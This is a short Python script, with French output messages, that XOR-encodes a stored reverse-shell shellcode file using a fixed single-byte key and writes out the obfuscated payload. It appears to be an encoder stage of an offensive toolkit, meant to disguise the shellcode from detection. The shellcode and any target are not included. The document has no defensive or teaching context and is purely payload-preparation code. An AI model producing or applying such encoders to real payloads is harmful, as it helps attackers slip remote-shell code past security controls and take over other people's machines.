#!/usr/bin/env python3
CLE = 0x41

with open("payload/reverse_shell_core.bin", "rb") as f:
    shellcode = f.read()

shellcode_xor = bytes([b ^ CLE for b in shellcode])

with open("payload/reverse_shell_core_xor.bin", "wb") as f:
    f.write(shellcode_xor)

print(f"[+] Shellcode original   : {len(shellcode)} bytes")
print(f"[+] Shellcode XOR-encodé : {len(shellcode_xor)} bytes")
print(f"[+] Clé utilisée         : 0x{CLE:02x}")
print(f"[+] Produit              : payload/reverse_shell_core_xor.bin")
print(f"\n[*] Original : {shellcode[:8].hex()}")
print(f"[*] Encodé   : {shellcode_xor[:8].hex()}")
